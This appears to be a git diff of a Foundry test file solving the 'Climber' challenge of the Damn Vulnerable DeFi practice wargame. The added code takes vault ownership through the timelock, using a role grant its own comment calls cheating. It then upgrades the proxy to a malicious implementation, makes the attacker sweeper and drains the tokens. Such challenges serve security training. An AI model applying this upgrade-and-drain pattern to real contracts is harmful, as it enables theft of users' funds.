@@ -8,6 +8,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+import {MaliciousVault} from "./MaliciousVault.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -86,24 +87,25 @@ contract Climber is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testClimberExploit() public {
         /** EXPLOIT START **/
         // 1. get access to timelock proposer role
         // cheating for now
         vm.prank(proposer);
 
-        // 2.1 prepare schedule call with transferownership
+        // 2. prepare schedule call with transferownership and updatedelay
         address[] memory climberVaultArr = new address[](1);
-        climberVaultArr[0] = (address(climberVaultProxy));
         uint256[] memory valueArr = new uint256[](1);
-        valueArr[0] = 0;
         bytes[] memory dataArr = new bytes[](1);
+
+        climberVaultArr[0] = (address(climberVaultProxy));
+        valueArr[0] = 0;
         dataArr[0] = abi.encodeWithSignature(
             "transferOwnership(address)",
             attacker
         );
 
-        // 2.2 schedule call on proxy w transferownership
+        // 3.1 schedule call array
         climberTimelock.schedule(
             climberVaultArr,
             valueArr,
@@ -111,14 +113,26 @@ contract Climber is Test {
             bytes32(0)
         );
 
-        // 2.3 wait and execute transaction
-        vm.warp(block.timestamp + 2 hours);
+        // 3.2 execute transaction
         vm.startPrank(attacker);
         climberTimelock.execute(climberVaultArr, valueArr, dataArr, bytes32(0));
 
-        // 3. update proxy to malicious contract
+        // 4. deploy and upgrade to malicious implementation
+        MaliciousVault malVault = new MaliciousVault();
+        ClimberVault(address(climberVaultProxy)).upgradeTo(address(malVault));
 
-        // 4.
+        // 5. set sweeper with fake withdraw function
+        ClimberVault(address(climberVaultProxy)).withdraw(
+            attacker,
+            address(0x0),
+            0
+        );
+        emit log_address(ClimberVault(address(climberVaultProxy)).getSweeper());
+        assertEq(
+            ClimberVault(address(climberVaultProxy)).getSweeper(),
+            attacker
+        );
+        ClimberVault(address(climberVaultProxy)).sweepFunds(address(dvt));
 
         vm.stopPrank();
         /** EXPLOIT END **/
